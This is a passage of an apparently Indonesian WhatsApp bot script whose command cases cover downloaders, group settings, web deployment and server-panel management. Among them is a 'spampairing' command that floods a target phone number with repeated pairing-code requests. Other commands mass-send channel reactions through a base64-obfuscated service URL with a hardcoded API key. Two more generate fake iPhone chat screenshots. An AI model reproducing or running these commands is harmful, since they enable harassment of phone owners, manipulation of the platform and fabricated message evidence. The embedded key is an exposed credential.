            };
            qr.decode(image.bitmap);
        } catch (error) {
            return m.reply("error : " + error)
        }
    });
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await readQRISFromBuffer(aa)
await Xuu.sendMessage(m.chat, {text: `${dd}`}, {quoted: m})
}
break;
//~~~~~~~~~~~~~~~~~~~~//

case "allpayment": {
const xuu = `primexuu-allpayment.vercel.app`
m.reply(xuu)
}
break
//~~~~~~~~~~~~~~~~~//

case "videy":
        {
          if (!text) {
            return reply("Masukkan Link Videy");
          }
          if (!text.includes("videy")) {
            return reply("Itu Bukan Link Videy");
          }
          try {
            let anu = await fetchJson(`https://api.agatz.xyz/api/videydl?url=${text}`);
            let anu1 = anu.data;
            Xuu.sendMessage(m.chat, {
              video: {
                url: anu1
              },
              caption: "Downloader Videy"
            }, {
              quoted: m
            });
          } catch (err) {
            reply("Terjadi Kesalahan Saat Mengambil Data");
          }
        }
        break

//~~~~~~~~~~~~~~~~~~~~//
        
case 'spampairing': {
  if (!isOwner && !isPremium) return m.reply('Khusus Premium');
  if (!text) return m.reply(`*Example:* ${prefix + command} +628xxxxxx|150`);
  m.reply('proses...');
  let [peenis, pepekk = "200"] = text.split("|");
  let target = peenis.replace(/[^0-9]/g, '').trim();
  const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
  const { state } = await useMultiFileAuthState('pepek');
  const { version } = await fetchLatestBaileysVersion();
  const pino = require("pino");
  const sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
  for (let i = 0; i < pepekk; i++) {
    await sleep(1500);
    let prc = await sucked.requestPairingCode(target);
    console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`);
  }
  await sleep(15000);
}
break;

//~~~~~~~~~~~~~~~~~~~~//

  case "spamreactch": {

if (!isOwner && !isPremium) return m.reply('Khusus Premium');

if (!text) return m.reply(".spamreactch linkpesan 😂")

if (!args[0] || !args[1]) return m.reply("Wrong Format")

if (!args[0].includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")

let result = args[0].split('/')[4]

let serverId = args[0].split('/')[5]

let res = await Xuu.newsletterMetadata("invite", result)

await Xuu.newsletterReactMessage(res.id, serverId, args[1])

m.reply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)

}

break

//~~~~~~~~~~~~~~~~~~~~//

case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
if (!result.status) return m.reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: Xuu.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await Xuu.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await Xuu.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
}
break

//~~~~~~~~~~~~~~~~~~~~//

case "tiktokmp3": case "ttmp3": case "ttaudio": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await Xuu.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~//

case "swgrup": {
                const quoted = m.quoted ? m.quoted : m;
                const mime = (quoted.msg || quoted).mimetype || "";
                const caption = m.body.replace(/^\.swgrup\s*/i, "").trim();
                const jid = m.chat;
                
                if (/image/.test(mime)) {
                    const buffer = await quoted.download();
                    await Xuu.sendMessage(jid, {
                        groupStatusMessage: {
                            image: buffer,
                            caption
                        }
                    });
                    m.react("âœ…ï¸")
                } else if (/video/.test(mime)) {
                    const buffer = await quoted.download();
                    await Xuu.sendMessage(jid, {
                        groupStatusMessage: {
                            video: buffer,
                            caption
                        }
                    });
                    m.react("âœ…ï¸")
                } else if (/audio/.test(mime)) {
                    const buffer = await quoted.download();
                    await Xuu.sendMessage(jid, {
                        groupStatusMessage: {
                            audio: buffer
                        }
                    });
                    m.react("âœ…ï¸")
                } else if (caption) {
                    await Xuu.sendMessage(jid, {
                        groupStatusMessage: {
                            text: caption
                        }
                    });
                    m.react("âœ…ï¸")
                } else {
                    await reply(`reply media atau tambahkan teks.\nexample: ${prefix + command} (reply image/video/audio) hai ini saya`);
                }
            }
break

//~~~~~~~~~~~~~~~~~~~~//

case 'tourlph': {
  async function uploadTelegraph(path) {
    try {
      let data = new FormData()
      data.append("images", fs.createReadStream(path))

      let config = {
        method: 'POST',
        url: 'https://telegraph.zorner.men/upload',
        headers: {
          ...data.getHeaders()
        },
        data
      }

      let response = await axios.request(config)
      return response.data.links || 'Gagal mengupload'
    } catch (error) {
      console.error("Error Upload:", error.message)
      return 'Error saat mengupload'
    }
  }

  if (!/image|video|audio|webp/.test(mime))
    return m.reply('Harus berupa video, gambar, audio, atau stiker')


  let media = await Xuu.downloadAndSaveMediaMessage(quoted)
  let telegraphUrl = await uploadTelegraph(media)

  let result = `🔗 *Hasil Upload*

🌐 *Telegraph:*
${telegraphUrl || '-'}
`

  await m.reply(result)
}
break

//~~~~~~~~~~~~~~~~~~~~//

case "react1k": {
if (!isCreator) return Reply(mess.owner)
let args = q.split(" ")
let link = args[0]
let emojis = args.slice(1).join(" ")
if (!link || !emojis)
return reply(
`contoh:
react https://whatsapp.com/channel/xxxx 😂,😮,👍,♥️`
)
const apiKeys = [
"588c5429be4a0420ce89ac849a7ec73b2d4ea880d900890ea5f6265a76e35212"
]
const apiKey = apiKeys[Math.floor(Math.random() * apiKeys.length)]
const urlb = "aHR0cHM6Ly9yZWFjdC53aHl1eC14ZWMubXkuaWQvYXBpL3JjaA=="
const apiUrl = Buffer.from(urlb, "base64").toString("utf8")
try {
const res = await fetch(
`${apiUrl}?link=${encodeURIComponent(link)}&emoji=${encodeURIComponent(emojis)}`,
{
method: "GET",
headers: {
"x-api-key": apiKey
}
}
)
const json = await res.json()
return m.reply(
`✅ Success Reaction
Link: ${link}
Emoji: ${emojis}`
)
} catch (err) {
console.error(err)
return m.reply(`Failed`)
}
}
break
//~~~~~~~~~~~~~~~~~~~//

case "trxoff": case "owneroff": {
if (!isOwner) return m.reply(mess.owner)
global.owneroff = true
m.reply('*Berhasil Mengganti Mode ✅*\nMode Bot Beralih Ke *Owner Offline*')
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "trxon": case "owneron": {
if (!isOwner) return m.reply(mess.owner)
global.owneroff = false
m.reply('*Berhasil Mengganti Mode ✅*\nMode Bot Beralih Ke *Owner Online*')
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilinkwame": {
if (!isGroup) return m.reply(mess.group)
if (!isOwner && !isAdmin) return m.reply(mess.admin)
if (!args[0]) return m.reply(example("on/off\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"))
if (/on/.test(args[0].toLowerCase())) {
if (antilinkwame.includes(m.chat)) return m.reply("*Antilink wa.me* Di Grup Ini Sudah Aktif!")
antilinkwame.push(m.chat)
await fs.writeFileSync("./library/database/antilinkwame.json", JSON.stringify(antilinkwame))
m.reply("*Berhasil Menyalakan Antilink wa.me Grup ✅")
} else if (/off/.test(args[0].toLowerCase())) {
if (!antilinkwame.includes(m.chat)) return m.reply("*Antilink wa.me* Di Grup Ini Belum Aktif!")
let posi = antilinkwame.indexOf(m.chat)
antilinkwame.splice(posi, 1)
await fs.writeFileSync("./library/database/antilinkwame.json", JSON.stringify(antilinkwame))
m.reply("*Berhasil Mematikan Antilink wa.me* ✅")
} else {
return m.reply(example("on/off"))
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'snackvideo': {
 if (!text) return reply("linknya mana?")
const data = fetchJson(`https://api.siputzx.my.id/api/d/snackvideo?url=${encodeURIComponent(text)}`)
const vidnya = data.result.media || ''
const cption = data.result.title || ''
Xuu.sendMessage(m.chat, { caption: cption, video: { url: vidnya } }, { quoted: m });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'delpanel': {
 if (!isOwner && !isReseller) {
 return m.reply(mess.owner);
 }
 const rows = []
 rows.push({
title: `Hapus Semua`,
description: `Hapus semua server panel`, 
id: `.delpanel-all`
}) 
 try {
 const response = await fetch(`${domain}/api/application/servers`, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: `Bearer ${apikey}`,
 },
 });

 const result = await response.json();
 const servers = result.data;

 if (!servers || servers.length === 0) {
 return m.reply("Tidak ada server panel!");
 }

 let messageText = `\n*Total server panel :* ${servers.length}\n`

 for (const server of servers) {
 const s = server.attributes;

 const resStatus = await fetch(`${domain}/api/client/servers/${s.uuid.split("-")[0]}/resources`, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: `Bearer ${capikey}`,
 },
 });

 const statusData = await resStatus.json();

 const ram = s.limits.memory === 0
 ? "Unlimited"
 : s.limits.memory >= 1024
 ? `${Math.floor(s.limits.memory / 1024)} GB`
 : `${s.limits.memory} MB`;

 const disk = s.limits.disk === 0
 ? "Unlimited"
 : s.limits.disk >= 1024
 ? `${Math.floor(s.limits.disk / 1024)} GB`
 : `${s.limits.disk} MB`;

 const cpu = s.limits.cpu === 0
 ? "Unlimited"
 : `${s.limits.cpu}%`;
 rows.push({
title: `${s.name} || ID:${s.id}`,
description: `Ram ${ram} || Disk ${disk} || CPU ${cpu}`, 
id: `.delpanel-response ${s.id}`
}) 
 } 
 await Xuu.sendMessage(m.chat, {
 buttons: [
 {
 buttonId: 'action',
 buttonText: { displayText: 'ini pesan interactiveMeta' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'Pilih Server Panel',
 sections: [
 {
 title: `© Powered By ${namaOwner}`,
 rows: rows
 }
 ]
 })
 }
 }
 ],
 headerType: 1,
 viewOnce: true,
 text: `\nPilih Server Panel Yang Ingin Dihapus\n`
}, { quoted: m })

 } catch (err) {
 console.error("Error listing panel servers:", err);
 m.reply("Terjadi kesalahan saat mengambil data server.");
 }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "anticall": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("on/off"))
if (text.toLowerCase() == "on") {
if (anticall) return m.reply("*Anticall* Sudah Aktif!")
anticall = true
m.reply("*Berhasil Menyalakan Anticall ✅*")
} else if (text.toLowerCase() == "off") {
if (!anticall) return m.reply("*Anticall* Sudah Tidak Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
anticall = false
m.reply("*Berhasil Mematikan Anticall ✅*")
} else {
return m.reply(example("on/off"))
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'deployweb': {
    if (!isCreator && !isSellerWeb) return m.reply('❌ Kamu tidak punya akses!');

    if (!text) return m.reply('❗ Masukkan nama web!\nContoh: cweb namaweb');

    if (!qmsg || !/zip|html/.test(qmsg.mimetype)) 
        return m.reply('❗ Balas file .zip atau .html');

    const webName = text.trim().toLowerCase().replace(/[^a-z0-9-_]/g, '');
    const domainCheckUrl = `https://${webName}.vercel.app`;

    // Cek domain sudah dipakai atau belum
    try {
        const check = await fetch(domainCheckUrl);
        if (check.status === 200) 
            return m.reply(`❌ Nama web *${webName}* sudah digunakan, silakan ganti nama lain.`);
    } catch (e) {}

    // Robust downloader: coba beberapa method agar kompatibel dgn berbagai SC/Baileys
    async function getQuotedBuffer(qmsg) {
        if (!qmsg) throw new Error('qmsg kosong');

        // 1) conn.downloadMediaMessage (beberapa SC punya)
        try {
            if (typeof conn.downloadMediaMessage === 'function') {
                const res = await Xuu.downloadMediaMessage(qmsg);
                if (res && (Buffer.isBuffer(res) || res instanceof Uint8Array)) return Buffer.from(res);
            }
        } catch (e) { /* ignore and try next */ }

        // 2) neo.downloadMediaMessage (jika ada variabel neo di SC)
        try {
            if (typeof neo !== 'undefined' && typeof neo.downloadMediaMessage === 'function') {
                const res = await neo.downloadMediaMessage(qmsg);
                if (res && (Buffer.isBuffer(res) || res instanceof Uint8Array)) return Buffer.from(res);
            }
        } catch (e) { /* ignore and try next */ }

        // 3) downloadContentFromMessage (Baileys helper) - buat stream -> buffer
        try {
            if (typeof downloadContentFromMessage === 'function') {
                // tentukan mtype
                const mtype = qmsg.mtype || (qmsg.message && Object.keys(qmsg.message)[0]) || 'document';
                const stream = await downloadContentFromMessage(qmsg.message || qmsg, mtype);
                const buffer = [];
                for await (const chunk of stream) buffer.push(chunk);
                return Buffer.concat(buffer);
            }
        } catch (e) { /* ignore and try next */ }

        // 4) jika qmsg sudah Buffer / base64
        try {
            if (Buffer.isBuffer(qmsg)) return qmsg;
            if (typeof qmsg === 'string' && /^[A-Za-z0-9+/=]+\s*$/.test(qmsg)) {
                return Buffer.from(qmsg, 'base64');
            }
        } catch (e) {}

        throw new Error('Tidak dapat mendownload media: downloader tidak tersedia di environment ini.');
    }

    let quotedFile;
    try {
        quotedFile = await getQuotedBuffer(qmsg);
    } catch (err) {
        console.error('Download media error:', err);
        return m.reply(`❌ Gagal mendownload file: ${err.message}`);
    }

    const filesToUpload = [];

    // ================= ZIP PROCESS ====================
    if (qmsg.mimetype.includes('zip')) {
        const unzipper = require('unzipper');
        const zipBuffer = Buffer.from(quotedFile);

        let directory;
        try {
            directory = await unzipper.Open.buffer(zipBuffer);
        } catch (err) {
            return m.reply("❌ ZIP error: File ZIP rusak atau tidak bisa dibaca.");
        }

        for (const file of directory.files) {
            if (file.type !== 'File') continue; // skip folder

            let content;
            try {
                content = await file.buffer();
            } catch {
                continue;
            }

            if (!file.path) continue;

            const safePath = file.path
                .replace(/^\/*/, "")     // buang slash depan
                .replace(/\/{2,}/g, "/") // buang double slash
                .replace(/^\.+/, "");    // fix path traversal

            if (!safePath || safePath.endsWith("/")) continue;

            filesToUpload.push({
                file: safePath,
                data: content.toString('base64'),
                encoding: 'base64'
            });
        }

        if (!filesToUpload.some(x => x.file.toLowerCase().endsWith('index.html'))) {
            return m.reply('❌ File *index.html* tidak ditemukan dalam ZIP.');
        }

    // ================= HTML FILE ====================
    } else if (qmsg.mimetype.includes('html')) {

        filesToUpload.push({
            file: 'index.html',
            data: Buffer.from(quotedFile).toString('base64'),
            encoding: 'base64'
        });

    } else {
        return m.reply('❌ File tidak dikenali. Kirim file .zip atau .html.');
    }

    // HEADER VERCEL
    const headers = {
        Authorization: `Bearer ${global.vercelToken}`,
        'Content-Type': 'application/json'
    };

    // BUAT PROJECT (ignore error jika sudah ada)
    await fetch('https://api.vercel.com/v9/projects', {
        method: 'POST',
        headers,
        body: JSON.stringify({ name: webName })
    }).catch(() => {});

    // DEPLOY
    const deployRes = await fetch('https://api.vercel.com/v13/deployments', {
        method: 'POST',
        headers,
        body: JSON.stringify({
            name: webName,
            project: webName,
            files: filesToUpload,
            projectSettings: { framework: null }
        })
    });

    const deployData = await deployRes.json().catch(() => null);
    if (!deployData || !deployData.url) {
        console.log('Deploy Error:', deployData);
        return m.reply(`❌ Gagal deploy ke Vercel:\n${JSON.stringify(deployData)}`);
    }

    // SUKSES
    m.reply(`✅ *Website berhasil dibuat!*\n\n🌐 URL: https://${webName}.vercel.app`);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'delweb': {
    if (!isCreator && !isSellerWeb) return m.reply(mesg.slr);

    // Ambil nama web dari text
    const webName = text?.trim().toLowerCase();
    if (!webName) return m.reply("❗ Contoh penggunaan: .delweb namaWeb");

    const headers = {
        Authorization: `Bearer ${global.vercelToken}`
    };

    try {
        // Request DELETE ke Vercel
        const response = await fetch(`https://api.vercel.com/v9/projects/${webName}`, {
            method: "DELETE",
            headers
        });

        if (response.status === 200 || response.status === 204) {
            return m.reply(`✅ Website *${webName}* berhasil dihapus dari Vercel.`);
        } else if (response.status === 404) {
            return m.reply(`⚠️ Website *${webName}* tidak ditemukan di akun Vercel kamu.`);
        } else if (response.status === 403 || response.status === 401) {
            return m.reply(`⛔ Token Vercel tidak valid atau tidak punya akses ke project ini.`);
        } else {
            let result = {};
            try { result = await response.json(); } catch(e) {}
            return m.reply(`❌ Gagal menghapus website:\n${result.error?.message || "Tidak diketahui"}`);
        }

    } catch (err) {
        console.error(err);
        return m.reply(`❌ Terjadi kesalahan saat mencoba menghapus:\n${err.message}`);
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'deployweb2': {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply("<namaWeb>");
    if (!m.quoted) return m.reply("❗ Balas file .zip atau .html dengan command ini!");

    const qmsg = m.quoted;
    const mime = qmsg.mimetype || qmsg.msg?.mimetype || "";
    if (!mime) return m.reply("❗ File tidak valid, balas file .zip atau .html!");
    if (!/zip|html/.test(mime)) return m.reply("❗ Format tidak didukung. Kirim .zip atau .html");

    // FIX BUFFER (ANTI ERROR)
    let fileBuffer;
    try {
        if (qmsg.download) fileBuffer = await qmsg.download(); 
        else if (qmsg.msg && qmsg.msg.fileMessage) fileBuffer = await conn.downloadMediaMessage(qmsg);
        else throw new Error("File tidak dapat diunduh");
    } catch (err) {
        return m.reply("❌ Gagal mengambil file, pastikan file valid!");
    }

    const webName = text.trim().toLowerCase().replace(/[^a-z0-9-_]/g, "");
    const repositoryName = `${webName}-website`;
    const githubApiUrl = "https://api.github.com/user/repos";
    const headers = {
        Authorization: `token ${global.githubToken}`,
        "Content-Type": "application/json"
    };

    try {
        // CREATE REPO
        const createRepoPayload = {
            name: repositoryName,
            private: false,
            auto_init: true,
            gitignore_template: "Node"
        };
        const repoRes = await fetch(githubApiUrl, {
            method: "POST",
            headers,
            body: JSON.stringify(createRepoPayload)
        });

        if (repoRes.status === 422)
            return m.reply(`❌ Repo *${repositoryName}* sudah ada.`);

        const filesToUpload = [];

        // ZIP
        if (mime.includes("zip")) {
            const unzipper = require("unzipper");
            const directory = await unzipper.Open.buffer(fileBuffer);

            for (const file of directory.files) {
                if (file.type === "File") {
                    const content = await file.buffer();
                    const cleanPath = file.path
                        .replace(/^\/+/, "")
                        .replace(/\\/g, "/");

                    filesToUpload.push({
                        file: cleanPath,
                        data: content.toString("base64"),
                        encoding: "base64"
                    });
                }
            }

            if (!filesToUpload.some(x => x.file.toLowerCase().endsWith("index.html")))
                return m.reply("❌ index.html tidak ditemukan dalam ZIP!");
        }
        // HTML
        else if (mime.includes("html")) {
            filesToUpload.push({
                file: "index.html",
                data: Buffer.from(fileBuffer).toString("base64"),
                encoding: "base64"
            });
        }

        // UPLOAD KE GITHUB
        const githubRepoUrl =
            `https://api.github.com/repos/${global.githubUsername}/${repositoryName}/contents`;

        for (let f of filesToUpload) {
            await fetch(`${githubRepoUrl}/${f.file}`, {
                method: "PUT",
                headers,
                body: JSON.stringify({
                    message: `Add ${f.file}`,
                    content: f.data
                })
            });
        }

        // ENABLE PAGES
        await fetch(
            `https://api.github.com/repos/${global.githubUsername}/${repositoryName}/pages`,
            {
                method: "POST",
                headers,
                body: JSON.stringify({
                    source: { branch: "main", path: "/" }
                })
            }
        );

        m.reply(
            `✅ Website berhasil dibuat!\n\n🌐 URL:\nhttps://${global.githubUsername}.github.io/${repositoryName}`
        );

    } catch (e) {
        console.log(e);
        m.reply("❌ Terjadi kesalahan saat deploy.");
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'listweb': {
    if (!isCreator) return m.reply(mess.owner);

    const headers = {
        Authorization: `Bearer ${global.vercelToken}`
    };

    try {
        const res = await fetch("https://api.vercel.com/v9/projects", { headers });
        const data = await res.json();

        if (!data.projects || data.projects.length === 0) return m.reply("❌ Tidak ada website yang ditemukan.");

        let teks = "*🌐 Daftar Website Anda:*\n\n";
        for (let proj of data.projects) {
            teks += `• ${proj.name} → https://${proj.name}.vercel.app\n`;
        }

        m.reply(teks);
    } catch (e) {
        console.error(e);
        m.reply("❌ Terjadi kesalahan saat mengambil daftar website.\n" + e.message);
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'gethtml': {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply("❗ Masukkan domain atau URL");

    try {
        let res = await fetch(text);
        if (!res.ok) return m.reply("❌ Gagal mengambil data dari URL tersebut");
        let html = await res.text();

        // pastikan folder ada
        const dirPath = path.join(__dirname, "./library/database/sampah/html_dump.html");
        if (!fs.existsSync(dirPath)) fs.mkdirSync(dirPath, { recursive: true });

        const filePath = path.join(dirPath, "html_dump.html");
        fs.writeFileSync(filePath, html);

        await Xuu.sendMessage(m.chat, {
            document: fs.readFileSync(filePath),
            mimetype: "text/html",
            fileName: "source.html"
        }, { quoted: m });

        fs.unlinkSync(filePath); // hapus setelah terkirim
    } catch (e) {
        console.error(e);
        m.reply("❌ Terjadi kesalahan saat mengambil HTML\n" + e.message);
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'listweb2': {
    // Mendapatkan waktu, tanggal, dan hari saat ini dengan zona waktu WIB (GMT+7)
    const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
    const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
    const day = days[currentDate.getDay()];
    const date = currentDate.toLocaleDateString("id-ID", { 
        day: 'numeric', 
        month: 'long', 
        year: 'numeric' 
    });
    const time = currentDate.toLocaleTimeString("id-ID");

    let name = m.pushName || "Pengguna"; // ✅ Tambahkan ini
 let teks = `

┏━━━━━⫷ LIST WEBSITE V2 ⫸━━━
┃➵ Website Jernih Foto
┃➵ https://jernihkan-foto-new.vercel.app
┃
┃➵ Website Payment
┃➵ https://website-payment-deploy.vercel.app
┃
┃➵ Website Unbaned Wa
┃➵ https://website-unbaned-deploy.vercel.app
┗━━━━━━━━━━━━⭓

> PAKE AJA TUH WEBSITE V2 NYA
> KALO MAU AMBIL SALIN LINK TERUS KETIK .scweb linknya`;

    await Xuu.sendMessage(m.chat, {
        image: fs.readFileSync('./xuu/primexuu.jpg'),
        caption: teks,
        contextInfo: {
            isForwarded: true, 
            mentionedJid: [m.sender, `${global.namaOwner}@s.whatsapp.net`], 
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                newsletterName: global.namaSaluran, 
                video: fs.readFileSync('./xuu/primexuu.jpg'), // diganti juga ke foto agar konsisten
                serverId: 200
            }
        }
    }, { quoted: qtext });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'editcase': {
    if (!isCreator) return m.reply(mess.owner);
    if (!text.includes("|")) return m.reply(`Contoh: cmd jpmch|jpmalluffy`);
    
    const [caseLama, caseBaru] = text.split("|").map(a => a.trim());
    if (!caseLama || !caseBaru) return m.reply(`Format salah!\nContoh: cmd jpmch|jpmalluffy`);

    const namaFile = path.join(__dirname, 'PRIMEXUU.js');

    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return m.reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
        }

        // regex buat nyari case
        const regex = new RegExp(`case\\s+'${caseLama}'\\s*:`, 'g');

        if (!regex.test(data)) {
            return m.reply(`Case '${caseLama}' tidak ditemukan di dalam file!`);
        }

        // replace dengan case baru
        const kodeBaruLengkap = data.replace(regex, `case '${caseBaru}':`);

        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                console.error('Terjadi kesalahan saat menulis file:', err);
                return m.reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
            } else {
                console.log(`Sukses mengubah case ${caseLama} menjadi ${caseBaru}`);
                return m.reply(`✅ Sukses! Case \`${caseLama}\` sudah diubah ke \`${caseBaru}\``);
            }
        });
    });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'iqc': {
 try {
 if (!text) {
 return Reply('Format salah! Gunakan: .iqc jam|batre|pesan\nContoh: .iqc 18:00|40|hai hai');
 }

 const parts = text.split('|');
 if (parts.length < 3) {
 return Reply('Format salah! Gunakan:\n.iqc jam|batre|pesan\nContoh:\n.iqc 18:00|40|hai hai');
 }

 const [time, battery, ...messageParts] = parts;
 const message = messageParts.join('|').trim();

 if (!time || !battery || !message) {
 return Reply('Format tidak lengkap! Pastikan mengisi jam, batre, dan pesan');
 }

 await Xuu.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

 const encodedTime = encodeURIComponent(time);
 const encodedMessage = encodeURIComponent(message);
 const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodedTime}&batteryPercentage=${battery}&carrierName=INDOSAT&messageText=${encodedMessage}&emojiStyle=apple`;

 const axios = require('axios');
 const response = await axios.get(url, { responseType: 'arraybuffer' });

 if (!response.data) {
 throw new Error('Gagal mendapatkan gambar dari server');
 }

 await Xuu.sendMessage(m.chat, {
 image: Buffer.from(response.data),
 caption: '✅ Pesan iPhone quote berhasil dibuat.'
 }, { quoted: m });

 await Xuu.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

 } catch (error) {
 console.error('Error di iqc:', error);
 Reply(`❌ Error: ${error.message || 'Terjadi kesalahan saat memproses'}`);
 }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'iqc2': {
 if (!q) return m.reply(`❌ Contoh:\n${prefix + command} hidup Jokowi`);

 const url = `https://veloria-ui.vercel.app/imagecreator/fake-chat?time=12:00&messageText=${encodeURIComponent(q)}&batteryPercentage=100`;

 await Xuu.sendMessage(m.chat, {
 image: { url },
 caption: "📱 *Fake iPhone Quoted Message*"
 }, { quoted: m });
}
 break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


case 'updomain': {
 if (!args[0]) return m.reply('❗ Masukkan link domain!\nContoh: *.updomain https://namadomain.com*');

 const linkDomain = args[0];

 await Xuu.sendMessage(m.chat, {
 caption: `🌐 Domain yang akan diupdate:\n${linkDomain}\n\nSilakan pilih server tempat domain akan diterapkan:`,
 image: { url: global.image.reply },
 footer: `© 2026 ${botname2} 🚀`,
 buttons: [
 {
 buttonId: `.updomain-v2 ${linkDomain}`,
 buttonText: { displayText: '🌐 Server' },
 type: 1
 }
 ],
 headerType: 1,
 viewOnce: true
 }, { quoted: qtext2 });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'updomain-v2': {
 const newDomain = args[0];

 if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");
 if (!newDomain) {
 return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} https://domain.com`);
 }

 global.domain = newDomain;

 const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

 reply(`✅ *Domain untuk Server berhasil diupdate!*\n\n🌐 *${newDomain}*`);

 const ownerJid = `${global.owner}@s.whatsapp.net`;
 Xuu.sendMessage(ownerJid, {
 text: `📢 *Perubahan Domain Server*\n\n🌐 *Domain Baru:* ${newDomain}\n🕒 *Waktu:* ${waktu}`,
 });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


case 'upapikey': {
 if (!args[0]) return m.reply('❗ Masukkan API Key!\nContoh: *.upapikey API_KEY_KAMU*');

 const apiKey = args[0];

 await Xuu.sendMessage(m.chat, {
 caption: `🔐 API Key yang akan diupdate:\n${apiKey}\n\nSilakan pilih server tempat API Key akan diterapkan:`,
 image: { url: global.image.reply },
 footer: `© 2025 ${botname2} 🚀`,
 buttons: [
 {
 buttonId: `.upapikey-v2 ${apiKey}`,
 buttonText: { displayText: '🛠️ Server' },
 type: 1
 }
 ],
 headerType: 1,
 viewOnce: true
 }, { quoted: qtext2 });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


case 'upapikey-v2': {
 const newKey = args[0];

 if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");

 if (!newKey) {
 return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} API_KEY_KAMU`);
 }

 global.apikey = newKey;

 const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
 const notifText = `✅ *API Key untuk Server berhasil diupdate!*\n\n🔑 *API Key Baru:* ${newKey}\n🕒 *Waktu:* ${waktu}`;

 Reply(notifText);

 const ownerJid = `${global.owner}@s.whatsapp.net`;
